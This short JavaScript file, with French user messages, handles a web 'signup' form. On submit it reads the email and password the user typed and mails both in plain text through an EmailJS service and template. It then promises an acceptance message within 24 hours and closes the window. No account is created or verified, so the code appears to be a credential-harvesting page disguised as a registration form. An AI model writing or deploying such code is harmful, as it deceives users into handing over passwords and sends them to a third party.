(function() {
  emailjs.init('8VmZYZXkS-C0txxS7'); // Remplacer TON_USER_ID par votre ID EmailJS
})();

document.getElementById('signup-form').addEventListener('submit', function(event) {
  event.preventDefault();

  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;

  emailjs.send('service_1e9p5on', 'template_vnqyt3m', {
    from_email: email,
    password: password
  })
  .then(function() {
    alert("Merci! Vous recevrez un message d'acceptation via courriel d'ici 24h.");
    window.close();
  }, function(error) {
    alert("Erreur: veuillez réessayer plus tard.");
    console.error('Erreur:', error);
  });
});
